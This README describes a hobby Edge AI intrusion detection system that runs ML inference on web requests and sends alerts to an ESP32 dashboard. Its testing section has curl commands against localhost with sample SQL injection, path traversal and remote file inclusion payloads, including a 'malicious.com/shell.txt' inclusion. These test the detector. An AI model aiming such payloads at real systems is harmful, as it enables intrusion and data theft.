# Diagnostic_Desk
Edge AI Intrusion Detection System (IDS) 🛡️

A decentralized, Edge AI-powered Intrusion Detection System with a Continuous Learning pipeline. This project offloads machine learning inference to a local Neural Processing Unit (NPU) to classify network traffic in real-time. When threats are detected, data is wirelessly transmitted to a standalone ESP32 microcontroller acting as a physical Security Operations Center (SOC), complete with a live web dashboard and an OLED display.

✨ Features

Continuous Learning Pipeline: Automatically appends new threats to the local dataset, retraining the AI model in the background based on real-world encounters.

Zero-Downtime Hot-Swapping: Asynchronous multithreading allows the system to swap out the old AI model for the newly trained one (in ONNX format) without ever dropping a live network packet.

Edge Hardware Acceleration: Utilizes onnxruntime to run ML inference locally on an NPU/GPU, eliminating cloud latency and API costs.

Decentralized SOC Node: An ESP32 microcontroller acts as an untethered alert node, featuring physical LED status indicators and a 0.96" OLED screen displaying real-time attacker IPs.

Embedded Live Dashboard: The ESP32 hosts a dark-mode, auto-refreshing HTML/JS web dashboard directly from its flash memory.

🛠️ Tech Stack & Architecture

The Artificial Intelligence Engine

Scikit-Learn (TF-IDF & Logistic Regression): Raw network traffic (URLs, SQLi, XSS) is converted into mathematical weights using a TF-IDF vectorizer. A Logistic Regression classifier draws boundaries to categorize the payloads as SAFE, WARN, or THREAT.

skl2onnx & ONNX Runtime: The Scikit-Learn pipeline is converted to the Open Neural Network Exchange (ONNX) format, allowing high-performance, hardware-accelerated inference.

The Network / Middleman (Python)

Watchdog: Monitors local server log files (system_errors.log) in real-time.

Requests: Transmits JSON-like payloads (SEV, IP, TIME) over the local Wi-Fi to the ESP32.

Threading: Separates the continuous "Watcher" logic from the heavy "Shadow Trainer" ML retraining logic.

The Hardware SOC Node (C++ / ESP32)

ESP32 Dual-Core MCU: Connects to the local 802.11 Wi-Fi and spins up an asynchronous web server.

Adafruit SSD1306: Drives the 0.96" OLED screen via I2C for physical threat readouts.

Circular Memory Array: Maintains the last 15 attack logs in memory to populate the web dashboard without exhausting the microcontroller's RAM.

🚀 Deployment & Installation

Prerequisites

Python 3.8+

Arduino IDE (with ESP32 board manager installed)

An ESP32 Microcontroller & 0.96" I2C OLED Display

Part 1: Python Environment Setup

Clone the repository and install dependencies:

pip install -r requirements.txt


Create the Environment Variables file:
Create a file named exactly .env in your root directory to securely store your paths and webhooks (following the 12-Factor App methodology):

LOG_FILE_PATH=system_errors.log
MODEL_FILE_PATH=network_watchdog.onnx
ESP32_WEBHOOK_URL=[http://192.168.1.](http://192.168.1.)XXX/update


(Note: You will update the IP address after booting the ESP32 in Part 2).

Part 2: ESP32 Hardware Setup

Wire the OLED Screen:

VCC -> 3.3V

GND -> GND

SCL -> Pin D22

SDA -> Pin D21

Status LEDs: Green on Pin 18, Orange on Pin 5.

Setup Secrets Configuration:
In your Arduino IDE, create a new tab named secrets.h to keep your Wi-Fi credentials out of the main code:

#define SECRET_WIFI_SSID "Your_WiFi_Network_Name"
#define SECRET_WIFI_PASS "Your_WiFi_Password"


Install Arduino Libraries & Flash:

Install Adafruit GFX Library and Adafruit SSD1306.

Flash the Esp32_sketch.ino to your board.

Check the OLED screen. It will display WiFi Connected! and provide an IP address (e.g., 192.168.1.45).

Important: Put this IP address back into your .env file under ESP32_WEBHOOK_URL.

💻 Running the System

Start the Watchdog:
Run the main Python inference script on your edge device:

python live_npu_inference.py


Open the Dashboard:
On any phone or computer on the same Wi-Fi network, type the ESP32's IP address into the browser to view the live SOC dashboard.

Simulate Attacks (Testing):
Open a new terminal and fire curl commands to trigger the system.

High Confidence Threats (Triggers Retraining Counter):

curl "http://localhost:8080/login?user=admin'%20OR%20'1'='1"
curl --path-as-is "http://localhost:8080/../../../windows/system32/cmd.exe"


Low Confidence Warnings (Ambiguous Payloads):

curl "http://localhost:8080/index.php?page=[http://malicious.com/shell.txt](http://malicious.com/shell.txt)"
curl "http://localhost:8080/api/users?id=1%20UNION%20SELECT%20password%20FROM%20admin"


🧠 Triggering Continuous Learning

By default, the AI is programmed to retrain after identifying 5 new THREATs. Fire 5 distinct THREAT level attacks at your server. You will see the background thread (Brain 2) wake up, read the updated dataset.csv, export network_watchdog_v2.onnx, and Hot-Swap the NPU engine in real-time.

Developed for Tech Club Demonstration - Edge AI & Network Security.
